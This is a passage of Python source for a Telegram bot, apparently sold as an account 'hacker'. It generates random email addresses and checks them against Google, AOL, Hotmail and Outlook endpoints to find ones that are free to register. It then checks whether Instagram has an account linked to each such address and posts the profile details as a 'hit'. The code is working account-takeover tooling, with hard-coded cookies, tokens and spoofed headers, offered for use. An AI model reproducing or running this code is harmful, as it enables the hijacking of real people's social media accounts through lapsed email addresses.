				headers = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Length': '18536','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'BX=05cdflhgh88dv&b=3&s=fa; GUC=AQEBAQFhFXNhHkIeKASA; rxx=230ufm9rd1p.2ffkvhk6&v=1; A1=d=AQABBL8hFGECEA1iv_3z3cem0COBi6yvsQIFEgEBAQFzFWEeYQAAAAAA_eMAAAcIvyEUYayvsQI&S=AQAAAngb50-m21aCLls9vcsvdIA; A3=d=AQABBL8hFGECEA1iv_3z3cem0COBi6yvsQIFEgEBAQFzFWEeYQAAAAAA_eMAAAcIvyEUYayvsQI&S=AQAAAngb50-m21aCLls9vcsvdIA; A1S=d=AQABBL8hFGECEA1iv_3z3cem0COBi6yvsQIFEgEBAQFzFWEeYQAAAAAA_eMAAAcIvyEUYayvsQI&S=AQAAAngb50-m21aCLls9vcsvdIA&j=WORLD; AS=v=1&s=9Ach1eVW&d=A6115734a|.jJjUM3.2Sq6mpRaeUvGOFaxkilDMMNq9Ri7WiuICAYOOQc8JzylVD7TqAyOQXyoGr3xjU5It2l8d2Tm2XplfzH_3CxVMv80ojV9Z2.2KK3pELyejomUkEej8.XfKekex.Y8YC.aN2I_2SK8dJrsij_oAiqz0F5q_AxGBEXANzyyOUk4SZBvgOyRlOVZZfqe1tH9zRhKo2pZ1sSrbHl3et7WTdq75c9ftrqF99EdnVhfX55FDU1s18vjW7yhqwnAR4wuzvLUp53LxbG0XAVElc29r1qDyJ5FaMTplnZzc8qs73k0YQ5CBNdeyLQh6_xlUZDPF3EaPrn9XaJEL_IRPJTt9lh7cFMDyMygjEjL3c9.vDyB7bwl6yDEgtWrB0TolID0D_m3WNruvGdsfqqTKHJO.tFLx00tnx_aYJqqVhmRTi_UgdGMAwv_Ns3eT_Ole8uf5okFWiVAN1Att2io_NuZsS3h6kOWMkER6k3h2isdL4pnCJPoskQTs2gDRo.CaRjcNBQk_v985XvaIGGYsw3Kcgm0ZZk.ni3fv.4uUvpxB431Xi_LLXeObPrKXrlLMVNiiAGEwv.0m5TtV41ib11dBba3jtsohTqUZpwIYEU4M4KF3G_N.2SfLRVYMUiNgOlO2ZLmxQmfWGPdysVpSo.UlJUUqEbKPZzJpH4Y_z8BWOeSjIEW9XOKCyf.ZeoXJufQVU5oS1V0_PydswVuYN7c2dOvWA.E7jrTMlPo3ZzaqshPohpubodq8ofYN9UowbOL8eYnyIKny.YvjJb6KLrCr0jersbNU1Z3pBHQutbA9l2iyl4RkMs01sRnL2PVa94n42RmMIEiVYvecUGO~A','Host': 'login.aol.com','Origin': 'https://login.aol.com','Referer': 'https://login.aol.com/account/create?intl=us&src=fp-us&.done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3DkYrCBuoE3NhBcpMPi7iWi4QTnplDEgs0%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E&specId=yidReg&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3DkYrCBuoE3NhBcpMPi7iWi4QTnplDEgs0%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E','Sec-Ch-Ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"','Sec-Ch-Ua-Mobile': '?0','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': str(generate_user_agent()),'X-Requested-With': 'XMLHttpRequest'}
				data = {'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1628709339039,"render":1628709338648}}','specId': 'yidreg','crumb': 'H4.yvLRdejE','acrumb': '9Ach1eVW','done': 'https://api.login.aol.com/oauth2/authorize?client_id=dj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2&intl=us&nonce=kYrCBuoE3NhBcpMPi7iWi4QTnplDEgs0&redirect_uri=https%3A%2F%2Foidc.www.aol.com%2Fcallback&response_type=code&scope=mail-r+openid+openid2+sdps-r&src=fp-us&state=eyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E','attrSetIndex': '0','tos0': 'oath_freereg|us|en-US','firstName': 'dlsdl','lastName': 'alo','yid': str(eml),'password': 'https://t.me/SidraTools','shortCountryCode': 'US','phone': '2097635173','mm': '1','dd': '5','yyyy': '2000','freeformGender': '','signup': '' }
				response = requests.post('https://login.aol.com/account/module/create?validateField=yid', data=data, headers=headers)
				if str('"yid"') in str(response.text):
					bad+=1
				else:
					ya+=1
					
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")			
	elif call.data =="F2":
		facebook = 'https://t.me/z9oon/12'
		bot.send_video(call.message.chat.id,facebook,caption="Welcome to Menu Facebook\nSEND /face IN BOOT" )
	elif call.data =="F3":
		tiktok = 'https://t.me/z9oon/11'
		bot.send_video(call.message.chat.id,tiktok,caption="Welcome to Menu TikTok\nSEND /tik IN BOOT" )
	elif call.data =="F4":
		snapchat = 'https://t.me/z9oon/8'
		bot.send_video(call.message.chat.id,snapchat,caption="Welcome to Menu SnapChat\nSEND /snap IN BOOT" )
	elif call.data =="F5":
		twi = 'https://t.me/z9oon/3'
		bot.send_video(call.message.chat.id,twi,caption="Welcome to Menu Twitter\nSEND /twi IN BOOT" )


@bot.message_handler(content_types=['text'])
def start(me):
	if me.text == '/insta' or me.text == '/insta@CH_IG_FB_TK_SNAP_BOT':
		instagram = 'https://t.me/z9oon/5'
		bot.send_video(me.chat.id,instagram,caption= '**ʰᵉˡˡᵒ ʷᵒʳˡᵈ ʷᵉˡˡᶜᵒᵐᵉ ᵗᵒ ᵐᵉᶰᵘ ᶤᶰˢᵗᵃᶠ!ᵍʳᵃᵐ**\n**ˢᵉᶰᵈ /cinsta ᶠᵒʳ ᶜʰᵉᶜᵏᵉʳ ᵃᶜᶜᵒᵘᶰᵗ ᶤᶰˢᵗᵃ**\n**ˢᵉᶰᵈ /hinsta ᶠᵒʳ ʰᵘᶰᵗᵉʳ ᶤᶰˢᵗᵃᵍʳᵃᵐ ᵃᶜᶜᵒᵘᶰᵗ**\n**ˢᵉᶰᵈ /uinsta ᶠᵒʳ ᶜʰᵉᶜᵏᵉʳ ᵘˢᵉʳ ᶤᶰˢᵗᵃᵍʳᵃᵐ**\n **ˢᵉᶰᵈ /ginsta ᶠᵒʳ ᵍʳᵉᵃᵗ ᵃᶜᶜᵒᵘᶰᵗ ᶤᶰˢᵗᵃᵍʳᵃᵐ**\n**ˢᵉᶰᵈ /start ᶠᵒʳ ᵇᵃᶜᵏ ᵗᵒ ʰᵒᵐᵉ ᵐᵉᶰᵘ**',parse_mode = "markdown")
	elif me.text == '/face' or me.text == '/face@CH_IG_FB_TK_SNAP_BOT':
		facebook = 'https://t.me/z9oon/12'
		bot.send_video(me.chat.id,facebook,caption= '**ʰᵉˡˡᵒ ʷᵒʳˡᵈ ʷᵉˡˡᶜᵒᵐᵉ ᵗᵒ ᵐᵉᶰᵘ ᶠᵃᶜᵉᵇᵒᵒᵏ**\n**ˢᵉᶰᵈ /hfb ᶠᵒʳ ʰᵘᶰᵗᵉʳ ᶠᵃᶜᵉᵇᵒᵒᵏ**\n**ˢᵉᶰᵈ /start ᶠᵒʳ ᵇᵃᶜᵏ ᵗᵒ ʰᵒᵐᵉ ᵐᵉᶰᵘ**',parse_mode = "markdown")
	elif me.text == '/tik' or me.text == '/tik@CH_IG_FB_TK_SNAP_BOT':
		tiktok = 'https://t.me/z9oon/11'
		bot.send_video(me.chat.id,tiktok,caption= '**ʰᵉˡˡᵒ ʷᵒʳˡᵈ ʷᵉˡˡᶜᵒᵐᵉ ᵗᵒ ᵐᵉᶰᵘ ᵗᶤᵏᵗᵒᵏ**\n**ˢᵉᶰᵈ /htik ᶠᵒʳ ʰᵘᶰᵗᵉʳ ᵗᶤᵏᵗᵒᵏ**\n**ˢᵉᶰᵈ /utik ᵗᵒ ᶜʰᵉᶜᵏ ᵘˢᵉʳ ᵗᶤᵏᵗᵒᵏ**\n**ˢᵉᶰᵈ /start ᶠᵒʳ ᵇᵃᶜᵏ ᵗᵒ ʰᵒᵐᵉ ᵐᵉᶰᵘ**',parse_mode = "markdown")
	elif me.text == '/twi' or me.text == '/twi@CH_IG_FB_TK_SNAP_BOT':
		twi = 'https://t.me/z9oon/4' 
		bot.send_video(me.chat.id,twi,caption='**ʰᵉˡˡᵒ ʷᵒʳˡᵈ ʷᵉˡˡᶜᵒᵐᵉ ᵗᵒ ᵐᵉᶰᵘ ᵗʷᶤᵗᵗᵉʳ**\n**ˢᵉᶰᵈ /htwi ᶠᵒʳ ʰᵘᶰᵗᵉʳ **\n**ˢᵉᶰᵈ /utwi ᵗᵒ ᶜʰᵉᶜᵏ ᵘˢᵉʳ ᵗʷᶤᵗᵗᵉʳ**\n**ˢᵉᶰᵈ /start ᶠᵒʳ ᵇᵃᶜᵏ ᵗᵒ ʰᵒᵐᵉ ᵐᵉᶰᵘ**',parse_mode = "markdown")
	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':
		snapchat = 'https://t.me/z9oon/10'
		bot.send_video(me.chat.id,snapchat,caption= "**ʰᵉˡˡᵒ ʷᵒʳˡᵈ ʷᵉˡˡᶜᵒᵐᵉ ᵗᵒ ᵐᵉᶰᵘ ˢᶰᵃᵖᶜʰᵃᵗ**\n**ˢᵉᶰᵈ /hsnap ᶠᵒʳ ʰᵘᶰᵗᵉʳ **\n**ˢᵉᶰᵈ /usnap ᵗᵒ ᶜʰᵉᶜᵏ ᵘˢᵉʳ ˢᶰᵃᵖᶜʰᵃᵗ**\n**ˢᵉᶰᵈ /start ᶠᵒʳ ᵇᵃᶜᵏ ᵗᵒ ʰᵒᵐᵉ ᵐᵉᶰᵘ**",parse_mode = "markdown")
	elif me.text == '/hinsta' or me.text == '/hinsta@CH_IG_FB_TK_SNAP_BOT':
		gm=0;ya=0;ot=0;ho=0;ao=0;mr=0;bad=0;hit=0;ins=0
		while True:
			tk = secrets.token_hex(8)*2
			sets= ['@gmail.com','@aol.com','@yahoo.com','@mail.ru','@hotmail.com','@outlook.com']
			domin = random.choice(sets)
			r = '1234567890'
			u = str("".join(random.choice(r)for i in range(4)))
			n0 = names.get_first_name(gender='male')
			n1 = names.get_first_name()
			n2 = names.get_first_name(gender='femal')
			pa2 = n0 + u 
			pa3 = n1 + u 
			pa4 = n2 + u
			ema = Faker().email().split("@")[0]
			em = (n0,n1,n2,ema,pa2,pa3,pa4)
			emil = random.choice(em)
			email = emil+domin
			user = email.split('@')[0]
			if (email.split('@')[1])=='gmail.com':
				email = email
				user = user
				url = "https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=404581&rt=j"
				headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '3893','content-type': 'application/x-www-form-urlencoded;charset=UTF-8','cookie': str(secrets.token_hex(8)*2),'google-accounts-xsrf': '1','origin': 'https://accounts.google.com','referer': 'https://accounts.google.com/AddSession/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': str(generate_user_agent()),'x-chrome-id-consistency-request': '','x-client-data': 'CI22yQEIorbJAQjBtskBCKmdygEIlqzKAQj4x8oBCKTNygEI3NXKAQj69coBCKicywEI1ZzLAQjknMsBCKmdywEIj57LARj6uMoBGNrDygE=','Decoded': 'message ClientVariations{//Active client experiment variation IDs.repeated int32 variation_id = [3300109, 3300130, 3300161, 3313321, 3315222, 3318776, 3319460, 3320540, 3324666, 3329576, 3329621, 3329636, 3329705, 3329807];// Active client experiment variation IDs that trigger server-side behavior.repeated int32 trigger_variation_id = [3316858, 3318234];','x-same-domain': '1'}
				data = {'continue': 'https://myaccount.google.com/?utm_source=sign_in_no_continue','service': 'accountsettings','f.req': f'["{email}","AEThLlyp7e8ZsnZVwqW6O6dyrUGthqFi3KgSDIKQ-jIN-HJog_ECd1rQ289cSyeWpvYWmjHgASDBl5ljNHwIWNYfM6YFjUr1qawgVmBEBzgob0Tqp3lsbCDkBo1eTwz319csjVy8B_PfeU41-yRSDTdCwDLcX95Y06Q-qmthw5UvWZtR2AO65Hl_j9y3dGOcyYHlcIqelFau_3w5ckfIhsN_OOoDEpBolrsyqKpRbI7l37prdSp7LT-OFMRA8R9t9nv2ozxQqink",[],null,"SA",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{email}",null,null,null,true,true,[]]','bgRequest': '["identifier","!fX6lfjLNAAVYPFQiWELoHEqEce7DhzsAKQAjCPxG3Usnx0Mt4oCV2WuMmMPNAmHqjS8FF9FLfr_DNs9Ee3KRD9bnAgAAAPFSAAABJ2gBB5kDxcfo1I4QFOC0hQL4sji6wB59zG3NRM8ajk9u0FF3LfCAAkJXofy8ZwjWcqE3xYQA6L4Yygpo75Cd07R4paBKZkGvT15KsoAADsPpXNQDEbZLd8_becZDkV8NecNncn13sId3_E__Nk5cBe9VNTVkCLgxIojVK-ZAH_YFx1cWWVQbUewGgvk-4e7fmV3PLhQTWSNmgb7CafarU4OV1vxY33ru4p9PFQxYI5uTzwzn5ulBCDZq2z8tfLq2Sk8lWIZzjCGpXgcHiZkf9_rLmfLew7JlZjX7o2ggX6uUIgCuWZ0yGWonvBzfYBvkb8PF5VkBERPSUc05peo8ZXDPkVH0Y8PTEsfovcbXn3HPS_91PtTmg2Mtq1Sv8nm0T155kcHuYJMDUnZoz5N1-HjDjeR73rogzDleiRUq90_2qQ0fXEZa3NX2pqusrK_q7NIGCyaXF-kb82jEaFo_l38UBoA25exc6v3tXudke4CYW8AmSr4DmnGXAgsfdiLjTy6KBStGZSRpjljOJLvsI7NxSOxTSG-NtnzoqAo4_pCJkrcCqfQXgAyF_-giWOZd2LCeVHsXigVCXKYnwPjqwTq6AHnzG8VkNPATaRLTusnIXCYWqE6h6ZW3n3LD-ZMvptZefM5HZR4NdEVTm0yEhCUhJqytGxxGRDppzebgNndVHl2_zVSQXbw84sEJKqzMYS1uieJ-cXhAidCN4vZM9VQDeESLJaPR-khrlYzPL5SzcWSBHH-4AcJOd3zo4c-YiSVSU9LRIduito8MaC4iBpCIQRwmsYvRVlVljCmTMcB-CstK7TH7rw2LfW1rVm79QZvpyCuX0vYdrlWo5lzMuIAtQLyoRxsAUIcHDh9b0SKHboABH9WZQMLcx_7WjqkJ4HTf723AVwrhUREmXcomNWG4m6Yd39kejtb_k_tjzz6eVNuBrP1pV4haQ5zflRsf62e3qYtfeMkzcg8bYrKkQievTXaas7dlUBiJEpfJGrB-1ztmyKRq-c_PvaCjJ1eRURTujrS188v6pd6EXCY0cNprrtXgKWDEMQBTJIBYHTP_9djO7XUdNNMlZsIRwNOaVpjJRXO9i0RpyFh_6EO5paqFdtwaVPYPvNyIfl1rydThZNth3jjrP4UZts5SD5M68SvHZNulr5W5vKKfkE9iY2srgJVQMbkjheXT4rycnwZmLjgVP0b7VZvRsgzV4oSgoG9oa4MV4lz74ELZYJXcYoNnWWXMFP6hSkdjDQzhx8QC4PHmqeSfXlx5YG5gswZocfNcVbXloVBsUlmH"]','at': 'AFoagUXYzuwuqMYsRm5RMqDomQCtdHo6Yg:1613081767804','azt': 'AFoagUWgWYFtaBKM-_bHqckBRCFYh-zFbA:1613081767805','cookiesDisabled': 'false','deviceinfo': '[null,null,null,[],null,"SA",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"85c34cca-3c34-4e5f-9eb6-6b60e8f09b25",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,1,null,false]','gmscoreversion': 'undefined','checkConnection': 'youtube:353:0','checkedDomains': 'youtube','pstMsg': '1'}
				response = requests.post(url, data=data, headers=headers)
				if (',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[]') in response.text:
					gm+=1
					
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(me.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
			elif (email.split('@')[1])=='hotmail.com':
				email = email
				user = user
				url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + str(email) + "&_=1604288577990"
				headers = {"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded","User-Agent": str(generate_user_agent()),"Connection": "close","Host": "odc.officeapps.live.com","Accept-Encoding": "gzip, deflate","Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0","Accept-Language": "ar,en-US;q=0.9,en;q=0.8","canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c","uaid": "d06e1498e7ed4def9078bd46883f187b","Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
				data = ""
				response = requests.post(url, data=data, headers=headers)
				if ("Neither") in response.text:
					ho+=1
					
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
					headers = {'Host':'www.instagram.com','content-length':'72','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','sec-ch-ua-mobile':'?0','x-instagram-ajax':'57ac339ce6f4','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36','x-csrftoken':tk,'sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-encoding':'gzip, deflate, br','accept-language':'en-IQ,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5','cookie':'csrftoken='+str(tk)}
					req = requests.post(url, headers=headers, data=data).text
					if 'Another account is using the same email.' in req:
						ins+=1
						hit+=1
						url = requests.get('https://kssd.herokuapp.com/info.php?user={}'.format(user)).text
						copyright = url.split('{"username"')[0]
						
						name = url.split(',"name":"')[1].split('"')[0]
						bio = url.split('"bio":"<div class="user__info-desc"> <br />')[1].split('</div"')[0]
						post = url.split('"post":"<li class="list__item">')[1].split('</li>"')[0]
						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
						hacker =" https://t.me/z9oon/13"
						bot.send_video(me.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
			elif (email.split('@')[1])=='outlook.com':
				email = email
				user = user
				url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + str(email) + "&_=1604288577990"
				headers = {"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded","User-Agent": str(generate_user_agent()),"Connection": "close","Host": "odc.officeapps.live.com","Accept-Encoding": "gzip, deflate","Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0","Accept-Language": "ar,en-US;q=0.9,en;q=0.8","canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c","uaid": "d06e1498e7ed4def9078bd46883f187b","Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
				data = ""
				response = requests.post(url, data=data, headers=headers)
				if ("Neither") in response.text:
					ot+=1
					
					emll = urllib.parse.quote(email)
					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
